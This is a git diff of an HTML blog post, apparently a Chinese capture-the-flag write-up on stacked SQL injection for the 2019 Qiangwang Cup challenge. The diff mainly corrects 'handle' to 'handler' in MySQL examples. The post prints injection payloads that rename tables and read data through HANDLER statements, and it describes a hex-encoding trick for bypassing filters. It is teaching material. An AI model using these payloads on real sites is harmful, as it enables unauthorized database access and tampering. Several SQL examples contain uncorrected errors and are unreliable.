@@ -22,7 +22,7 @@
 <meta property="og:image" content="https://github.com/xiaocheng10/xiaocheng10.github.io/blob/master/image/%E5%BC%BA%E7%BD%912019%E9%9A%8F%E4%BE%BF%E6%B3%A82.jpg">
 <meta property="og:image" content="https://github.com/xiaocheng10/xiaocheng10.github.io/blob/master/image/%E5%BC%BA%E7%BD%912019%E9%9A%8F%E4%BE%BF%E6%B3%A82.jpg">
 <meta property="article:published_time" content="2021-07-16T16:00:00.000Z">
-<meta property="article:modified_time" content="2021-07-16T07:16:43.661Z">
+<meta property="article:modified_time" content="2021-09-10T14:39:14.817Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="sql注入">
 <meta name="twitter:card" content="summary">
@@ -219,7 +219,10 @@
       
         <h1 id="2019年强网杯随便注入（堆叠注入实例）"><a href="#2019年强网杯随便注入（堆叠注入实例）" class="headerlink" title="2019年强网杯随便注入（堆叠注入实例）"></a>2019年强网杯随便注入（堆叠注入实例）</h1><h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><p>分号(;)在sql数据库中代表一句sql语句的结束，而如果在sql语句结束的后面在构造一条sql语句的话，会不会被执行呢？答案是肯定的。<br>因此，堆叠注入就是用分号作为每句sql语句的分隔，然后不断地在payload里构造sql语句。而联合注入（union select）与堆叠注入<br>的区别在于联合语句（union select）构造的sql语句是有限的，可以用来查询语句，而堆叠注入可以构造多条任意的sql语句。</p>
 <p>缺点：堆叠注入第二个语句发生错误的话，由于 web系统中执行代码通常只会回显查询结果，所以我们在前端无法看到错误的结果的，<br>          所以读取数据，最好用联合注入</p>
-<h3 id="用法："><a href="#用法：" class="headerlink" title="用法："></a>用法：</h3><p>新建表</p>
+<h3 id="用法："><a href="#用法：" class="headerlink" title="用法："></a>用法：</h3><p>启用phpstudy的mysql的命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p</span><br></pre></td></tr></table></figure>
+
+<p>新建表</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create table test like users //新建test这个数据表</span><br></pre></td></tr></table></figure>
 
 
@@ -247,25 +250,25 @@
 <p>添加表中的列</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alter table test add id int unsigned not null auto_increment primary key //进入test表，添加id这个列并自动赋值，auto_increment是自动赋值</span><br></pre></td></tr></table></figure>
 
-<p>###mysql数据库中的handle语句</p>
+<p>###mysql数据库中的handler语句</p>
 <p>创建一个表</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">creat table handle_table(int id,name varchar(10)) //创建一个handle_table表，表里有id和name两个列</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">creat table handler_table(int id,name varchar(10)) //创建一个handle_table表，表里有id和name两个列</span><br></pre></td></tr></table></figure>
 
 <p>表中依次插入数据</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into handle_table values(3,&#x27;张三&#x27;) //在handle_table表中插入数据：id=3，name=&#x27;张三&#x27;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into handler_table values(3,&#x27;张三&#x27;) //在handle_table表中插入数据：id=3，name=&#x27;张三&#x27;</span><br></pre></td></tr></table></figure>
 
 <p>打开一个表的句柄</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">handle test open as a //打开一个test表的句柄，并命名为a</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">handler test open as a //打开一个test表的句柄，并命名为a</span><br></pre></td></tr></table></figure>
 
 <p>不通过索引值看表，最后一行再用nest的话，回显示空格</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">handle test read first //查看test表中的第一行</span><br><span class="line">handle test read nest //查看test表中的下一行</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">handler test read first //查看test表中的第一行</span><br><span class="line">handler test read nest //查看test表中的下一行</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 
 <p>通过索引值查看表</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">creat index handle_index on handle_table(id) //将handle_table表中的id字段创建索引，并命名为handle_index</span><br><span class="line"></span><br><span class="line">handle handle_table open as p //打开handle_table表中的句柄，并命名为p</span><br><span class="line"></span><br><span class="line">handle handle_table read handle_index first //获取handle_table表中第一行的数据，此时handle_index=(1)，也可以写成：handle handle_table read handle_index=(1)</span><br><span class="line"></span><br><span class="line">handle handle_table read handle_index next //获取handle_table表中的下一行数据</span><br><span class="line"></span><br><span class="line">handle handle_table read handle_index prev //获取handle_table表中的上一行数据</span><br><span class="line"></span><br><span class="line">handle handle_table read handle_index last //获取handle_table表中的最后一行数据</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">creat index handler_index on handler_table(id) //将handle_table表中的id字段创建索引，并命名为handle_index</span><br><span class="line"></span><br><span class="line">handler handler_table open as p //打开handle_table表中的句柄，并命名为p</span><br><span class="line"></span><br><span class="line">handler handler_table read handler_index first //获取handle_table表中第一行的数据，此时handle_index=(1)，也可以写成：handle handle_table read handle_index=(1)</span><br><span class="line"></span><br><span class="line">handler handler_table read handler_index next //获取handle_table表中的下一行数据</span><br><span class="line"></span><br><span class="line">handler handler_table read handler_index prev //获取handle_table表中的上一行数据</span><br><span class="line"></span><br><span class="line">handler handle_table read handler_index last //获取handle_table表中的最后一行数据</span><br></pre></td></tr></table></figure>
 
 <p>关闭handle_table表的句柄</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">handle handle_table close</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">handler handler_table close</span><br></pre></td></tr></table></figure>
 
 
 
@@ -278,9 +281,9 @@
 <p>构造payload</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?inject=1&#x27;;rename table words to words1;rename table `1919810931114514` to words;alter table words add id  int unsigned not null auto_increment primary key;alter </span><br><span class="line">table words change flag data varcgae(100);--+</span><br></pre></td></tr></table></figure>
 
-<p>第二种解法：<br>利用handle语句</p>
+<p>第二种解法：<br>利用handler语句</p>
 <p>构造payload</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?inject=1&#x27;;handle `1919810931114514` open;handle `1919810931114514` read next;handle `1919810931114514` close;--+</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?inject=1&#x27;;handler `1919810931114514` open;handler `1919810931114514` read next;handler `1919810931114514` close;--+</span><br></pre></td></tr></table></figure>
 
 <p>第三种解法</p>
 <p>将select语句进行16进制编码，绕过正则过滤。<br>可以使用prepare…from…预处理语句，会进行编码转换<br>然后用execute来执行由sqlprepare创建的sql语句<br>SET只能对后面的变量进行一次赋值</p>
